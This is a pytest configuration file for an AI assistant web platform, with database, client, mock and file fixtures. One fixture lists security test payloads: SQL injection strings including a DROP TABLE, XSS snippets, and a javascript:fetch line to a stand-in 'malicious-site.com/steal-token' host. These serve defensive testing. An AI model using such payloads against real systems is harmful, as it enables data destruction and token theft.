"""
Comprehensive test configuration and fixtures for AI Assistant Platform.
"""
import asyncio
import json
import os
import tempfile
from pathlib import Path
from typing import AsyncGenerator, Dict, List, Optional
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import pytest_asyncio
from fastapi.testclient import TestClient
from httpx import AsyncClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

# Import the main application
from backend.main import app
from backend.app.core.config import settings
from backend.app.core.database import get_db
from backend.app.models.base import Base

# Test configuration
TEST_DATABASE_URL = "postgresql://test_user:test_password@localhost:5434/chatassistant_test"
TEST_REDIS_URL = "redis://localhost:6380"
TEST_WEAVIATE_URL = "http://localhost:8081"

# Test data fixtures
TEST_USER_DATA = {
    "email": "test@example.com",
    "username": "testuser",
    "password": "testpassword123",
    "first_name": "Test",
    "last_name": "User",
    "role": "user"
}

TEST_ADMIN_DATA = {
    "email": "admin@example.com",
    "username": "admin",
    "password": "adminpassword123",
    "first_name": "Admin",
    "last_name": "User",
    "role": "admin"
}

TEST_ASSISTANT_DATA = {
    "name": "Test Assistant",
    "description": "A test assistant for testing purposes",
    "system_prompt": "You are a helpful test assistant.",
    "model": "gpt-4",
    "temperature": 0.7,
    "max_tokens": 1000,
    "is_active": True
}

TEST_CONVERSATION_DATA = {
    "title": "Test Conversation",
    "assistant_id": 1,
    "user_id": 1
}

TEST_MESSAGE_DATA = {
    "content": "Hello, this is a test message",
    "role": "user",
    "conversation_id": 1
}

TEST_DOCUMENT_DATA = {
    "title": "Test Document",
    "description": "A test document for testing",
    "file_path": "/tmp/test_document.pdf",
    "file_size": 1024,
    "file_type": "pdf"
}

TEST_TOOL_DATA = {
    "name": "Test Tool",
    "description": "A test tool for testing",
    "category": "search",
    "function_name": "test_function",
    "parameters": {
        "query": {"type": "string", "description": "Search query"}
    }
}

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture(scope="session")
def test_engine():
    """Create test database engine."""
    engine = create_engine(TEST_DATABASE_URL)
    yield engine
    engine.dispose()

@pytest.fixture(scope="session")
def test_db_session_factory(test_engine):
    """Create test database session factory."""
    TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=test_engine)
    yield TestingSessionLocal

@pytest.fixture(scope="function")
def test_db_session(test_db_session_factory):
    """Create test database session."""
    # Create tables
    Base.metadata.create_all(bind=test_db_session_factory.bind)
    
    session = test_db_session_factory()
    yield session
    
    # Cleanup
    session.close()
    Base.metadata.drop_all(bind=test_db_session_factory.bind)

@pytest.fixture
def override_get_db(test_db_session):
    """Override database dependency for testing."""
    def _override_get_db():
        try:
            yield test_db_session
        finally:
            pass
    
    app.dependency_overrides[get_db] = _override_get_db
    yield
    app.dependency_overrides.clear()

@pytest.fixture
def client(override_get_db):
    """Create test client."""
    with TestClient(app) as test_client:
        yield test_client

@pytest_asyncio.fixture
async def async_client(override_get_db):
    """Create async test client."""
    async with AsyncClient(app=app, base_url="http://test") as ac:
        yield ac

# Redis Mocking
@pytest.fixture(scope="session", autouse=True)
def setup_redis_mock():
    """Setup Redis mock for all tests."""
    mock_redis = AsyncMock()
    mock_redis.get.return_value = None
    mock_redis.set.return_value = True
    mock_redis.delete.return_value = True
    mock_redis.incr.return_value = 1
    mock_redis.ping.return_value = True
    mock_redis.exists.return_value = False
    mock_redis.expire.return_value = True
    mock_redis.ttl.return_value = 3600

    with (
        patch("backend.app.core.redis_client.redis_client", mock_redis),
        patch("backend.app.core.redis_client.get_redis", return_value=mock_redis),
        patch("backend.app.core.redis_client.init_redis", return_value=mock_redis),
        patch("backend.app.core.redis_client.check_redis_connection", return_value=True),
        patch(
            "backend.app.core.redis_client.get_redis_info",
            return_value={
                "status": "connected",
                "version": "7.0.0",
                "connected_clients": 1,
                "used_memory_human": "1.0M",
                "uptime_in_seconds": 3600,
                "keyspace_hits": 100,
                "keyspace_misses": 10,
            },
        ),
    ):
        yield

# Weaviate Mocking
@pytest.fixture(scope="session", autouse=True)
def setup_weaviate_mock():
    """Setup Weaviate mock for all tests."""
    mock_weaviate = MagicMock()
    mock_weaviate.collections.get.return_value = MagicMock()
    mock_weaviate.collections.create.return_value = MagicMock()
    mock_weaviate.collections.delete.return_value = True
    mock_weaviate.data.insert.return_value = {"id": "test-id"}
    mock_weaviate.data.get.return_value = {"id": "test-id", "properties": {}}
    mock_weaviate.data.delete.return_value = True
    mock_weaviate.query.get.return_value = MagicMock()
    mock_weaviate.query.aggregate.return_value = MagicMock()

    with patch("backend.app.core.weaviate_client.weaviate_client", mock_weaviate):
        yield

# Authentication Fixtures
@pytest.fixture
def test_user_headers(client, test_user_data):
    """Create authenticated user headers."""
    # Register user
    response = client.post("/api/auth/register", json=test_user_data)
    assert response.status_code == 201
    
    # Login
    login_data = {
        "username": test_user_data["email"],
        "password": test_user_data["password"]
    }
    response = client.post("/api/auth/login", data=login_data)
    assert response.status_code == 200
    
    token = response.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}

@pytest.fixture
def test_admin_headers(client, test_admin_data):
    """Create authenticated admin headers."""
    # Register admin
    response = client.post("/api/auth/register", json=test_admin_data)
    assert response.status_code == 201
    
    # Login
    login_data = {
        "username": test_admin_data["email"],
        "password": test_admin_data["password"]
    }
    response = client.post("/api/auth/login", data=login_data)
    assert response.status_code == 200
    
    token = response.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}

# Data Fixtures
@pytest.fixture
def test_user(test_db_session):
    """Create test user in database."""
    from backend.app.models.user import User
    from backend.app.core.security import get_password_hash
    
    user = User(
        email=TEST_USER_DATA["email"],
        username=TEST_USER_DATA["username"],
        hashed_password=get_password_hash(TEST_USER_DATA["password"]),
        first_name=TEST_USER_DATA["first_name"],
        last_name=TEST_USER_DATA["last_name"],
        role=TEST_USER_DATA["role"]
    )
    test_db_session.add(user)
    test_db_session.commit()
    test_db_session.refresh(user)
    return user

@pytest.fixture
def test_admin(test_db_session):
    """Create test admin in database."""
    from backend.app.models.user import User
    from backend.app.core.security import get_password_hash
    
    admin = User(
        email=TEST_ADMIN_DATA["email"],
        username=TEST_ADMIN_DATA["username"],
        hashed_password=get_password_hash(TEST_ADMIN_DATA["password"]),
        first_name=TEST_ADMIN_DATA["first_name"],
        last_name=TEST_ADMIN_DATA["last_name"],
        role=TEST_ADMIN_DATA["role"]
    )
    test_db_session.add(admin)
    test_db_session.commit()
    test_db_session.refresh(admin)
    return admin

@pytest.fixture
def test_assistant(test_db_session, test_user):
    """Create test assistant in database."""
    from backend.app.models.assistant import Assistant
    
    assistant = Assistant(
        name=TEST_ASSISTANT_DATA["name"],
        description=TEST_ASSISTANT_DATA["description"],
        system_prompt=TEST_ASSISTANT_DATA["system_prompt"],
        model=TEST_ASSISTANT_DATA["model"],
        temperature=TEST_ASSISTANT_DATA["temperature"],
        max_tokens=TEST_ASSISTANT_DATA["max_tokens"],
        is_active=TEST_ASSISTANT_DATA["is_active"],
        created_by=test_user.id
    )
    test_db_session.add(assistant)
    test_db_session.commit()
    test_db_session.refresh(assistant)
    return assistant

@pytest.fixture
def test_conversation(test_db_session, test_user, test_assistant):
    """Create test conversation in database."""
    from backend.app.models.conversation import Conversation
    
    conversation = Conversation(
        title=TEST_CONVERSATION_DATA["title"],
        user_id=test_user.id,
        assistant_id=test_assistant.id
    )
    test_db_session.add(conversation)
    test_db_session.commit()
    test_db_session.refresh(conversation)
    return conversation

@pytest.fixture
def test_message(test_db_session, test_conversation):
    """Create test message in database."""
    from backend.app.models.message import Message
    
    message = Message(
        content=TEST_MESSAGE_DATA["content"],
        role=TEST_MESSAGE_DATA["role"],
        conversation_id=test_conversation.id
    )
    test_db_session.add(message)
    test_db_session.commit()
    test_db_session.refresh(message)
    return message

@pytest.fixture
def test_document(test_db_session, test_user):
    """Create test document in database."""
    from backend.app.models.document import Document
    
    document = Document(
        title=TEST_DOCUMENT_DATA["title"],
        description=TEST_DOCUMENT_DATA["description"],
        file_path=TEST_DOCUMENT_DATA["file_path"],
        file_size=TEST_DOCUMENT_DATA["file_size"],
        file_type=TEST_DOCUMENT_DATA["file_type"],
        uploaded_by=test_user.id
    )
    test_db_session.add(document)
    test_db_session.commit()
    test_db_session.refresh(document)
    return document

@pytest.fixture
def test_tool(test_db_session):
    """Create test tool in database."""
    from backend.app.models.tool import Tool
    
    tool = Tool(
        name=TEST_TOOL_DATA["name"],
        description=TEST_TOOL_DATA["description"],
        category=TEST_TOOL_DATA["category"],
        function_name=TEST_TOOL_DATA["function_name"],
        parameters=TEST_TOOL_DATA["parameters"]
    )
    test_db_session.add(tool)
    test_db_session.commit()
    test_db_session.refresh(tool)
    return tool

# File Fixtures
@pytest.fixture
def temp_file():
    """Create temporary file for testing."""
    with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as f:
        f.write(b"Test file content for testing purposes.")
        temp_file_path = f.name
    
    yield temp_file_path
    
    # Cleanup
    if os.path.exists(temp_file_path):
        os.unlink(temp_file_path)

@pytest.fixture
def temp_pdf_file():
    """Create temporary PDF file for testing."""
    # Create a simple PDF file for testing
    with tempfile.NamedTemporaryFile(delete=False, suffix=".pdf") as f:
        # Minimal PDF content
        pdf_content = b"%PDF-1.4\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n>>\nendobj\n4 0 obj\n<<\n/Length 44\n>>\nstream\nBT\n/F1 12 Tf\n72 720 Td\n(Test PDF) Tj\nET\nendstream\nendobj\nxref\n0 5\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000204 00000 n \ntrailer\n<<\n/Size 5\n/Root 1 0 R\n>>\nstartxref\n297\n%%EOF\n"
        f.write(pdf_content)
        temp_file_path = f.name
    
    yield temp_file_path
    
    # Cleanup
    if os.path.exists(temp_file_path):
        os.unlink(temp_file_path)

# API Response Fixtures
@pytest.fixture
def mock_llm_response():
    """Mock LLM response for testing."""
    return {
        "id": "chatcmpl-test123",
        "object": "chat.completion",
        "created": 1677652288,
        "model": "gpt-4",
        "choices": [
            {
                "index": 0,
                "message": {
                    "role": "assistant",
                    "content": "This is a test response from the LLM."
                },
                "finish_reason": "stop"
            }
        ],
        "usage": {
            "prompt_tokens": 10,
            "completion_tokens": 8,
            "total_tokens": 18
        }
    }

@pytest.fixture
def mock_embedding_response():
    """Mock embedding response for testing."""
    return {
        "object": "list",
        "data": [
            {
                "object": "embedding",
                "embedding": [0.1, 0.2, 0.3, 0.4, 0.5] * 100,  # 500-dimensional vector
                "index": 0
            }
        ],
        "model": "text-embedding-ada-002",
        "usage": {
            "prompt_tokens": 5,
            "total_tokens": 5
        }
    }

# Test Data Loaders
@pytest.fixture
def test_data():
    """Load test data from fixtures."""
    fixtures_dir = Path(__file__).parent / "fixtures"
    
    test_data = {}
    for fixture_file in fixtures_dir.glob("*.json"):
        with open(fixture_file, "r", encoding="utf-8") as f:
            test_data[fixture_file.stem] = json.load(f)
    
    return test_data

# Performance Test Fixtures
@pytest.fixture
def performance_test_data():
    """Generate performance test data."""
    return {
        "users": [f"user{i}@test.com" for i in range(100)],
        "messages": [f"Test message {i}" for i in range(1000)],
        "documents": [f"document_{i}.pdf" for i in range(50)]
    }

# Security Test Fixtures
@pytest.fixture
def security_test_payloads():
    """Common security test payloads."""
    return {
        "sql_injection": [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>"
        ],
        "csrf": [
            "http://malicious-site.com/steal-token",
            "javascript:fetch('http://malicious-site.com/steal-token')"
        ]
    }

# Utility Functions
def create_test_file(content: str, extension: str = ".txt") -> str:
    """Create a test file with given content."""
    with tempfile.NamedTemporaryFile(delete=False, suffix=extension, mode="w") as f:
        f.write(content)
        return f.name

def cleanup_test_file(file_path: str):
    """Clean up test file."""
    if os.path.exists(file_path):
        os.unlink(file_path)

# Test Markers
pytest_plugins = [
    "tests.fixtures.auth",
    "tests.fixtures.data",
    "tests.fixtures.api"
]